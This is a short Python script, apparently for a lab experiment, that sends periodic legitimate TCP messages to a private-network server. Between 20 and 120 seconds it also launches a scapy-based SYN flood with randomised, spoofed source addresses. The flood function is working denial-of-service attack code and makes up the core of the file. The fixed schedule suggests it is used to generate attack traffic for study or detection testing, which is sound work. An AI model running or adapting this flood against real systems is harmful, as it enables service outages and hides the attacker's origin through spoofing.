import socket
import threading
import time
import random
from scapy.all import IP, TCP, send

SERVER_IP = "192.168.64.3"
SERVER_PORT = 8080
LEGITIMATE_INTERVAL = 5  # Send legitimate requests every 5 seconds

def send_legitimate_traffic():
    """Sends normal TCP traffic to the server."""
    global stop_legitimate
    while not stop_legitimate:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((SERVER_IP, SERVER_PORT))
                message = "Hello, Server! Legitimate Traffic."
                sock.sendall(message.encode())
                response = sock.recv(1024).decode()
                print(f"Received from server: {response}")
                
        except ConnectionRefusedError:
            print("Failed to connect to the server. Ensure it's running.")
        except KeyboardInterrupt:
            print("\nClient exiting...")

        time.sleep(LEGITIMATE_INTERVAL)

def syn_flood():
    """Performs a SYN flood attack on the server."""
    global stop_attack
    while not stop_attack:
        try:
            src_port = random.randint(1024, 65535)
            seq_num = random.randint(1000, 50000)
            ip_layer = IP(src=f"192.168.64.{random.randint(10, 250)}", dst=SERVER_IP)
            tcp_layer = TCP(sport=src_port, dport=SERVER_PORT, seq=seq_num, flags="S")
            send(ip_layer/tcp_layer, verbose=False)
        except Exception as e:
            print(f"SYN flood error: {e}")

# Global flags to control stopping conditions
stop_legitimate = False
stop_attack = False

# Start legitimate traffic at t=0
legit_thread = threading.Thread(target=send_legitimate_traffic)
legit_thread.start()

# Wait until t=20s, then start SYN flood
time.sleep(20)
print("[+] Starting SYN flood attack...")
attack_thread = threading.Thread(target=syn_flood)
attack_thread.start()

# Wait until t=120s, then stop SYN flood
time.sleep(100)
print("[+] Stopping SYN flood attack...")
stop_attack = True
attack_thread.join()

# Wait until t=140s, then stop legitimate traffic
time.sleep(20)
print("[+] Stopping legitimate traffic...")
stop_legitimate = True
legit_thread.join()
